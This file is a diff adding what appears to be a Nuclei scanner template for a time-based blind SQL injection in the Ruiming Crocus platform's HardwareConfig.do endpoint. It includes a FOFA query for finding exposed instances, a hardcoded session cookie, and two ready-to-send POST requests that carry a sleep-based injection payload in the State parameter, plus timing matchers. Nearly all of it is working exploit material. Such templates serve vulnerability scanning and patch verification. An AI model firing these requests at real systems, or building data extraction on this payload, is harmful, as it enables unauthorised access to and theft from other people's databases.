@@ -1,0 +1,39 @@
+id: ruiming-crocus-hardwareconfig-sqli
+info:
+  name: 锐明 Crocus HardwareConfig 接口SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: product="Crocus" || (body="/ThirdResource/respond/respond.min.js" && title="Crocus")
+      该系统在HardwareConfig接口处理过程中存在SQL注入缺陷，攻击者可通过构造恶意输入参数实现数据库查询注入，可能导致敏感数据泄露或数据篡改。此漏洞源于未对用户输入进行充分的参数化校验和注入过滤，影响Crocus平台核心硬件配置管理功能。
+  tags: 锐明
+http:
+- raw:
+  - |
+    POST /HardwareConfig.do?Action=ReadTask HTTP/1.1
+    Host: {{Hostname}}
+    Cookie: Saffron.U=VUlEPTEmR0lEPTE3NTk4MTczMjgyMzg0NyZSSUQ9MSZNPUdNYXAmSU5TPTA=
+    Content-Type: application/x-www-form-urlencoded
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Connection: keep-alive
+
+    PageIndex=0&PageSize=10&State=(select*from(select%0acase%0awhen%0aascii(substr(current_user,1,1))>1%0athen%0asleep(5)%0aelse%0a0%0aend)a)
+  - |
+    POST /HardwareConfig.do?Action=ReadTask HTTP/1.1
+    Host: {{Hostname}}
+    Cookie: Saffron.U=VUlEPTEmR0lEPTE3NTk4MTczMjgyMzg0NyZSSUQ9MSZNPUdNYXAmSU5TPTA=
+    Content-Type: application/x-www-form-urlencoded
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Connection: keep-alive
+
+    PageIndex=0&PageSize=10&State=(select*from(select%0acase%0awhen%0aascii(substr(current_user,1,1))>1%0athen%0asleep(8)%0aelse%0a0%0aend)a)
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
